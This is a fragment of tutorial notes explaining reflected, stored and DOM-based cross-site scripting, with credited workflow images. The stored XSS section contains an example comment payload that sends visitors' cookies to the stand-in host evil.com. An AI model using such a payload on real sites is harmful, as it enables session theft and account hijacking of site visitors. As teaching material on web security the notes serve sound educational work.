...
![Reflected XSS sample workflow](../../public/rxss.png)
...
![p-XSS sample workflow](../../public/pxss.png)
_Image from [Christopher Makarem](https://medium.com/iocscan/persistent-cross-site-scripting-p-xss-557c70377554)_

### Keys

Also known as stored XSS. The malicious script comes from the website's database, so this attack require few steps to succeed.
...
The attacker add a malicious payload in the comments section of the site.

```
POST "http://website.com/blog/post-1/comment", body{"<script>window.location='http://evil.com/?c='+document.cookie</script>}
```

So any user that visits the website will be vulnerable once this malicious comment is loaded.


## DOM XSS


![DOM-XSS sample workflow](../../public/dom_xss.png)
_Image from [Christopher Makarem](https://medium.com/iocscan/dom-based-cross-site-scripting-dom-xss-3396453364fd)_

### Keys 

If the attacker control any input field value, they can easily add malicious values:
